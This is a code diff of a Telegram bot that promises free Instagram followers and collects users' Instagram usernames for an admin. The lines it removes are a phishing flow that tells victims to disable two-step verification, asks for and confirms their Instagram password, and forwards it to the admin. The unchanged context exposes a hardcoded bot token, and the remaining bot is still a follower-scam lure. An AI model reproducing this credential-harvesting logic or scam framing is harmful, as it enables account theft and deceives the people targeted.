@@ -7,7 +7,6 @@ BOT_TOKEN = '7192034833:AAHdW7xJBwzMgz8FJ6pPb11fGCDyzHmsasA'
 CHANNEL_USERNAME = '@freeinstagramfollowers_10'
 ADMIN_ID = 6178260867
 
-# Start Flask for uptime ping
 app = Flask('')
 
 @app.route('/')
@@ -20,10 +19,8 @@ def run():
 def keep_alive():
     Thread(target=run).start()
 
-# User flow memory
 user_data = {}
 
-# Send menu with website + get followers
 def send_main_menu(update, first_name):
     buttons = [
         [InlineKeyboardButton("🌐 Website", url="https://free-insta-followers.netlify.app/")],
@@ -34,7 +31,6 @@ def send_main_menu(update, first_name):
         reply_markup=InlineKeyboardMarkup(buttons)
     )
 
-# /start command
 def start(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     first_name = update.effective_user.first_name
@@ -53,7 +49,6 @@ def start(update: Update, context: CallbackContext):
             reply_markup=InlineKeyboardMarkup(buttons)
         )
 
-# After clicking "I Have Joined"
 def check_join(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     first_name = update.effective_user.first_name
@@ -66,7 +61,6 @@ def check_join(update: Update, context: CallbackContext):
     else:
         update.callback_query.message.reply_text(f"❌ You're still not a member, {first_name}. Please join first.")
 
-# When "Get Free Followers" is clicked
 def button_callback(update: Update, context: CallbackContext):
     query = update.callback_query
     user_id = query.from_user.id
@@ -74,7 +68,6 @@ def button_callback(update: Update, context: CallbackContext):
     user_data[user_id] = {"step": "ask_username"}
     context.bot.send_message(chat_id=user_id, text="📱 Enter your Instagram username:")
 
-# Handle user responses
 def handle_messages(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     first_name = update.effective_user.first_name
@@ -95,22 +88,6 @@ def handle_messages(update: Update, context: CallbackContext):
     elif state["step"] == "ask_followers":
         if message.isdigit():
             state["followers"] = int(message)
-            state["step"] = "ask_password"
-            update.message.reply_text(
-                "⚠️ Please turn off *Two-Step Verification* in your Instagram account before continuing.\n\n"
-                "Now enter your Instagram password:",
-                parse_mode='Markdown'
-            )
-        else:
-            update.message.reply_text("❌ Please enter a valid number (e.g., 50, 100, 500).")
-
-    elif state["step"] == "ask_password":
-        state["password"] = message
-        state["step"] = "confirm_password"
-        update.message.reply_text("🔐 Please confirm your password:")
-
-    elif state["step"] == "confirm_password":
-        if message == state["password"]:
             update.message.reply_text(
                 f"✅ Thank you {first_name}!\n\n"
                 f"Your request for *{state['followers']}* followers has been submitted successfully. Please wait up to *24 hours*.\n"
@@ -126,18 +103,15 @@ def handle_messages(update: Update, context: CallbackContext):
                     "📥 New Follower Request:\n\n"
                     f"👤 Name: {full_name} (ID: `{tg_id}`)\n"
                     f"📸 Username: `{state['username']}`\n"
-                    f"🔢 Followers Wanted: {state['followers']}\n"
-                    f"🔐 Password: `{state['password']}`"
+                    f"🔢 Followers Wanted: {state['followers']}"
                 ),
                 parse_mode='Markdown'
             )
 
             del user_data[user_id]
         else:
-            update.message.reply_text("❌ Passwords do not match. Please enter your password again:")
-            state["step"] = "ask_password"
+            update.message.reply_text("❌ Please enter a valid number (e.g., 50, 100, 500).")
 
-# Main start
 def main():
     keep_alive()
     updater = Updater(BOT_TOKEN)
